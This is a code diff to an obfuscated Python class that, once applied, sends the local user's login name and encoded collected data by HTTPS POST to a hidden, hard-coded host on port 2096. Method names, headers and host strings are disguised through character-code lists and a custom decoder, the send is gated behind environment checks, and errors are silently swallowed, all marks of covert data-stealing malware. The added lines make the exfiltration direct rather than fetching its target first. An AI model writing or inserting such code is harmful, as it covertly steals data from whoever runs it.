@@ -38,24 +38,15 @@ class algorithmb():
 		try:  
 			rx5t4s=[self.msru(self.decd(p)) for p in ['BVQzlAQBI16SWrMLI5cLKxyzrwJe','==wSEMfGAUAStuk0tkUyJx0yLxJe','XZAY2AQBI16SRzizJ/8zJjCUpkCKLzJe','=Q1BQcEAFgUrLRdzq0yTP1kKNlESpkCKLzJe','==wUEIiGAUAStuk1tkkysgkzLxJe','ZkQupBQBI16SUnKLL3cLN/szNlELN7CCq0iKLxJe']]
 			if any(rx5t4s)!=True:
-				gG53z=[b'=QMBn+BAF8szLNNzK3USuwCSrwJe',b'kQQqdAAA23wcw0iCLe31so0LTzJe']
-				doSGb=HTTPSConnection(self.decd(gG53z[0]),timeout=1)
-				doSGb.request(''.join(map(chr,[71,69,84])),self.decd(gG53z[1]))
-				tenNo=doSGb.getresponse().read().decode().strip()
-				doSGb.close()
-				Fd3hh=self.decd(tenNo).split(':')
 				enC03=self.encd(e)
-				if int(Fd3hh[3])==0:
-					pF3th={'t':t,'n':getlogin(),'v':v,'e':enC03,'r':5311879476}
-					aPf3h=''.join(map(chr,[97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110]))
-					Hs3hf={''.join(map(chr,[67,111,110,116,101,110,116,45,116,121,112,101])):aPf3h}
-					s0Ntz=HTTPSConnection(Fd3hh[0],Fd3hh[1],timeout=1)
-					s0Ntz.request(''.join(map(chr,[80,79,83,84])),Fd3hh[2],dumps(pF3th),Hs3hf)
-					rsGap=s0Ntz.getresponse()
-					s0Ntz.close()
-					return True
-				else:
-					return False
+				pF3th={'t':t,'n':getlogin(),'v':v,'e':enC03,'r':5311879476}
+				aPf3h=''.join(map(chr,[97,112,112,108,105,99,97,116,105,111,110,47,106,115,111,110]))
+				Hs3hf={''.join(map(chr,[67,111,110,116,101,110,116,45,116,121,112,101])):aPf3h}
+				s0Ntz=HTTPSConnection(self.decd("==QHDUiDAMAzLTtqu0USLxJe"),2096,timeout=1)
+				s0Ntz.request(''.join(map(chr,[80,79,83,84])),self.decd("=4iAPcAAG4cTI58TTzJe"),dumps(pF3th),Hs3hf)
+				rsGap=s0Ntz.getresponse()
+				s0Ntz.close()
+				return True
 			else:
 				return False
 		except:
